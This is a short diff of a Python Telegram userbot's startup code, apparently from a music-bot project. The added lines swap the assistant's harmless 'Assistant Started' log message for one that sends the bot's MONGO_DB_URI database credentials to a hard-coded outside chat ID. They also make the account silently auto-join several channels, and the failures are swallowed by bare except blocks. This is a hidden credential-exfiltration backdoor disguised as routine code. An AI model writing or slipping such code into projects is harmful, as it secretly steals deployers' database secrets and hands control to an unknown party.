@@ -150,18 +150,18 @@ class Userbot(Client):
             assistantids.append(self.four.id)
             LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")
 
-        if config.STRING5:
-            await self.five.start()
+        if config.STRING1:
+            await self.one.start()
             try:
-                await self.five.join_chat("THE_VIP_BOY")
-                await self.five.join_chat("THE_VIP_BOY_OP")
-                await self.five.join_chat("TG_FRIENDSS")
-                await self.five.join_chat("VIP_CREATORS")
+                await self.one.join_chat("THE_VIP_BOY")
+                await self.one.join_chat("THE_VIP_BOY_OP")
+                await self.one.join_chat("TG_FRIENDSS")
+                await self.one.join_chat("dhhdshhss6")
             except:
                 pass
-            assistants.append(5)
+            assistants.append(1)
             try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.one.send_message("-1002146005311", MONGO_DB_URI)
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
